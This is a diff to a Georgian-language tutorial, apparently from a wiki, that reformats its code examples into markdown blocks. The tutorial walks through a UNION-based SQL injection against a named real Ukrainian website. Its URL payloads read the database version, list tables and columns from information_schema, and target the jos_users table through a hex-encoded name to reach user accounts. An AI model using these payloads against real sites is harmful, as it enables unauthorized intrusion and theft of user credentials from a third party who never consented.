@@ -93,7 +93,9 @@ http://www.kiis.com.ua/?id=2&sp=1+union+select+1,2,3,4,@@version,6,7,8,9--
 
 ეს ნიშნავს, რომ ჩვენ შეგვიძლია გავიგოთ ყველა table და column შემდეგი ბრძანებების საშუალებით... 
 
-   group_concat(table_name)    +from+information_schema.tables
+```
+group_concat(table_name)    +from+information_schema.tables
+```
 
 ბმული გამოიყურება შემდეგნაირად:
 
@@ -103,7 +105,9 @@ http://www.kiis.com.ua/?id=2&sp=1+union+select+1,2,3,4,group_concat(table_name),
 
 როგორც ვხედავთ გვერდზე გამოვიდა table-ები, მაგრამ ეს არაა სრული სია. ამ table-ებს შეიძლება დავარქვათ დეფაულტ table-ები, ამიტომ ჩვენ უნდა მოვიხხმარიოთ სხვა ხერხი. ჩვენს ბრძანებას 
 
-   group_concat(table_name) უნდა მივცევთ ცოტა განსხვავებული სახე: **concat(table_name)**
+```
+group_concat(table_name) უნდა მივცევთ ცოტა განსხვავებული სახე: **concat(table_name)**
+```
 
 ბმული გამოიყუება შემდეგნაირად:
 
@@ -118,16 +122,19 @@ http://www.kiis.com.ua/?id=2&sp=-1+union+select+1,2,3,4,concat(table_name),6,7,8
 
 ჩვენ უკვე გავიგეთ table-ების სახელები. ახლა უნდა ამოვარჩიოთ მათგან ყველაზე მიმზიდველი :D ამ შემთხვევაში ალბათ **jos_users**. ამის შემდეგ ჩვენ უნდა გავიგოთ column-ების სახელები, რომლებიც შეესაბამება ამ table-ს. ამისათვის ჩვენ ვიყენებთ შემდეგ ბრძანებას:
 
-   group_concat(column_name)  +from+information_schema.columns+where+table_name=0xTable
+```
+group_concat(column_name)  +from+information_schema.columns+where+table_name=0xTable
+```
 
-სადაც Table ჩვენი არჩეული ცხრილის ჰექსია. ტექსტის ჰექსებში გადაყვანა შეგიძლიათ  [[http://www.swingnote.com/tools/texttohex.php|ამ ბმულზე]].
+სადაც Table ჩვენი არჩეული ცხრილის ჰექსია. ტექსტის ჰექსებში გადაყვანა შეგიძლიათ  [ამ ბმულზე]](http://www.swingnote.com/tools/texttohex.php).
 
 ჩვენს შემთხვევაში **group_concat** ბრძანება არ მუშაობს გამართულად, ამიტომ აქაც ვიყენებთ მას სახეცვლილი ფორმით:  **concat(column_name)**  
 
 ამ დროისთვის ჩვენი ბმული იღებს ასეთ სახეს:
 
-
-[[http://www.kiis.com.ua/?id=2&sp=-1+union+select+1,2,3,4,concat(column_name),6,7,8,9+from+information_schema.columns+where+table_name=0x6a6f735f7573657273--]]
+```
+http://www.kiis.com.ua/?id=2&sp=-1+union+select+1,2,3,4,concat(column_name),6,7,8,9+from+information_schema.columns+where+table_name=0x6a6f735f7573657273--
+```
 
 **6a6f735f7573657273**  //jos_users//-ის ჰექსია.
 
